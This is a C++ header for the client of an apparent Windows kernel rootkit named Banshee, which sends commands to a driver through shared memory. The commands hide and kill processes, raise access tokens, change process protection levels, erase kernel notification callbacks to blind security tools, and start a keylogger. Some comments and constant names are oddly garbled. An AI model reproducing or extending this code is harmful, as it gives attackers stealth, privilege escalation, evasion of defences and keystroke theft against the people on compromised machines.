#pragma once

#include <Windows.h>
#include <string>
#include <filesystem>
#include <codecvt>
#include <locale>
#include <iostream>
#define DEBUG_CLIENT
#ifdef DEBUG_CLIENT
#include <stdio.h>
#endif

// --------------------------------------------------------------------------------------------------------
// Commands

enum COMMAND_TYPE
{
    NONE = 0,
    KILL_PROCESS = 1,
    PROTECT_PROCESS = 2,
    ELEVATE_TOKEN = 3,
    HIDE_PROCESS = 4,
    ENUM_CALLBACKS = 5,
    ERASE_CALLBACKS = 6,
    START_KEYLOGGER = 7,
    UNLOAD = 8
};

enum CALLBACK_TYPE {
    CallbackTypeNone = 0,
    CreateProcessNotifyRoutine = 1,
    CreateThreadNotifyRoutine = 2
};

typedef struct _CALLBACK_DATA {
    UINT64 driverBase;
    UINT64 offset;
    WCHAR driverName[64];
} CALLBACK_DATA;

typedef struct _BANSHEE_PAYLOAD {
    COMMAND_TYPE cmdType;
    ULONG status;
    ULONG ulValue;
    BYTE byteValue;
    WCHAR wcharString[64];
    CALLBACK_DATA callbackData[32];
} BANSHEE_PAYLOAD;

// --------------------------------------------------------------------------------------------------------

enum BANSHEE_STATUS 
{
    BE_SUCCESS = 0,
    BE_ERR_DRIVER_NOT_EXISTS = 1,
    BE_ERR_FAILED_TO_INSTALL = 2,
    BE_ERR_FAILED_TO_INITIALIZE = 3,
    BE_ERR_IOCTL = 4,
    BE_ERR_GENERIC = 5,
};

// Protection Levels - Windows Internals Part 1 - Page 115 (7th english edition)
BYTE PS_PROTECTED_SYSTEM = 0x72; // Geschützt WinSystem
BYTE PS_PROTECTED_WULONGCB = 0x62; // Geschützt WinTcb
BYTE PS_PROTECTED_WULONGCB_LIGHT = 0x61; // PPL WinTcb
BYTE PS_PROTECTED_WINDOWS = 0x52; // Geschützt Windows
BYTE PS_PROTECTED_WINDOWS_LIGHT = 0x51; // PPL Windows
BYTE PS_PROTECTED_LSA_LIGHT = 0x41; // PPL Lsa
BYTE PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31; // PPL Anti - malware
BYTE PS_PROTECTED_AUTHENTICODE = 0x21; // Geschützt Authenticode
BYTE PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11; // PPL Authenticode
BYTE PS_PROTECTED_NONE = 0x00; // Keine Keine

// --------------------------------------------------------------------------------------------------------

class Banshee
{
private:
    HANDLE hMapFile = NULL;
    BANSHEE_PAYLOAD* pSharedBuf = NULL;
    HANDLE hCommandEvent = NULL;
    HANDLE hAnswerEvent = NULL;

    BANSHEE_STATUS
    SendSimpleCommand(const PVOID& payload)
    {
        // Write command to shared memory
        memcpy((PVOID)pSharedBuf, payload, sizeof(BANSHEE_PAYLOAD));

        // Set the event to signalize that a payload was written
        if (!SetEvent(hCommandEvent))
        {
            return BE_ERR_GENERIC;
        }

        // Wait for answer event, if it was written, read the simple answer from the buffer
        // Simple answer = BE_STATUS code
        DWORD dwWaitResult = WaitForSingleObject(hAnswerEvent, INFINITE);

        // Reset the answer event after the answer was read
        if (!ResetEvent(hAnswerEvent))
        {
            return BE_ERR_GENERIC;
        }

        return (BANSHEE_STATUS)pSharedBuf->status;
    }

public:
    Banshee()
    {

    }

    ~Banshee()
    {
        UnmapViewOfFile(pSharedBuf);
        CloseHandle(hMapFile);
        CloseHandle(hCommandEvent);
        CloseHandle(hAnswerEvent);
    }

    /**
     * Initializes the Banshee driver by getting a handle to the shared memory regions used to communicate.
     *
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS Initialize()
    {
        auto BUF_SIZE = sizeof(BANSHEE_PAYLOAD);

        // Create file mappings for command and answer shared memory regions
        hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, L"Global\\BeShared");
        if (hMapFile == NULL)
        {
#ifdef DEBUG_CLIENT
            printf("Error with OpenFileMappingW\n");
#endif
            return BE_ERR_FAILED_TO_INITIALIZE;
        }

        pSharedBuf = (BANSHEE_PAYLOAD*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
        if (pSharedBuf == NULL)
        {
#ifdef DEBUG_CLIENT
            printf("Error with MapViewOfFile\n");
#endif
            return BE_ERR_FAILED_TO_INITIALIZE;
        }

#ifdef DEBUG_CLIENT
        printf("Getting Events\n");
#endif
        // Get handles to events
        hCommandEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"Global\\BeCommandEvt");
        hAnswerEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"Global\\BeAnswerEvt");

        if (hCommandEvent == NULL || hAnswerEvent == NULL)
        {
#ifdef DEBUG_CLIENT
            printf("Error with Events\n");
#endif
            return BE_ERR_FAILED_TO_INITIALIZE;
        }

        return BE_SUCCESS;
    }

    BANSHEE_STATUS KillProcess(const DWORD& pid)
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = KILL_PROCESS;
        payload.ulValue = pid;
        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS HideProcess(const DWORD& pid)
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = HIDE_PROCESS;
        payload.ulValue = pid;
        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS EraseCallbacks(std::string targetDriver, const CALLBACK_TYPE& cbType)
    {
        INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, NULL, 0);
        wchar_t* wsTargetDriver = new wchar_t[wchars_num];  
        MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, wsTargetDriver, wchars_num);

        BANSHEE_PAYLOAD payload;
        payload.cmdType = ERASE_CALLBACKS;
        payload.ulValue = (ULONG)cbType;
        memcpy(payload.wcharString, wsTargetDriver, wchars_num * sizeof(WCHAR));

        delete[] wsTargetDriver;

        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS StartKeylogger(const BOOL& shouldStart)
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = START_KEYLOGGER;
        payload.byteValue = shouldStart;
        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS ElevateProcessAccessToken(const DWORD& pid)
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = ELEVATE_TOKEN;
        payload.ulValue = pid;
        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS ProtectProcess(const DWORD& pid, const BYTE& newLevel)
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = PROTECT_PROCESS;
        payload.ulValue = pid;
        payload.byteValue = newLevel;
        return SendSimpleCommand((PVOID)&payload);
    }

    BANSHEE_STATUS EnumerateCallbacks(const CALLBACK_TYPE& type, OUT std::vector<CALLBACK_DATA>& callbackData)
    {
        BANSHEE_PAYLOAD payload;

        payload.cmdType = ENUM_CALLBACKS;
        payload.ulValue = (ULONG)type;

        auto status = SendSimpleCommand((PVOID)&payload); 
        if (status != BE_SUCCESS)
        {
            return status;
        }
        for (ULONG i = 0L; i < pSharedBuf->ulValue; ++i)
        {
            auto cbData = pSharedBuf->callbackData[i];
            callbackData.push_back(
                pSharedBuf->callbackData[i]
            );
        }
        return BE_SUCCESS;
    }

    BANSHEE_STATUS Unload()
    {
        BANSHEE_PAYLOAD payload;
        payload.cmdType = UNLOAD;

        // Write command to shared memory and set the event to signalize that a payload was written
        memcpy((PVOID)pSharedBuf, &payload, sizeof(BANSHEE_PAYLOAD));
        if (!SetEvent(hCommandEvent))
        {
            return BE_ERR_GENERIC;
        }
        return BE_SUCCESS;
    }
};